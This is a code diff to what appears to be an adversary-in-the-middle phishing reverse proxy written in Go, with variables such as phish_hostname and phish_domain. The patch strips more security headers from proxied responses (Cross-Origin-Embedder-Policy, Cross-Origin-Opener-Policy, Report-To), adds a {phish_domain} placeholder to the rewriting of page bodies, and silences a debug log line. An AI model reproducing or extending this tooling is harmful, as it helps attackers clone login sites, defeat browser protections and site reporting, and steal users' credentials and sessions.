@@ -816,6 +816,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				"X-XSS-Protection",
 				"X-Content-Type-Options",
 				"X-Frame-Options",
+				"Cross-Origin-Embedder-Policy",
+        "Cross-Origin-Opener-Policy",
+        "Report-To",
 			}
 			for _, hdr := range rm_headers {
 				resp.Header.Del(hdr)
@@ -1014,6 +1017,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									replace_s = strings.Replace(replace_s, "{hostname_regexp}", regexp.QuoteMeta(phish_hostname), -1)
 									replace_s = strings.Replace(replace_s, "{subdomain_regexp}", regexp.QuoteMeta(phish_sub), -1)
 									replace_s = strings.Replace(replace_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
+									replace_s = strings.Replace(replace_s, "{phish_domain}", regexp.QuoteMeta(phish_domain), -1)
+
 									phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
 									if ok {
 										replace_s = strings.Replace(replace_s, "{domain}", phishDomain, -1)
@@ -1021,7 +1026,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 
 									if re, err := regexp.Compile(re_s); err == nil {
-										log.Debug("regexp `%s` -> `%s`", re_s, replace_s)
+										// log.Debug("regexp `%s` -> `%s`", re_s, replace_s)
 										body = []byte(re.ReplaceAllString(string(body), replace_s))
 									} else {
 										log.Error("regexp failed to compile: `%s`", sf.regexp)
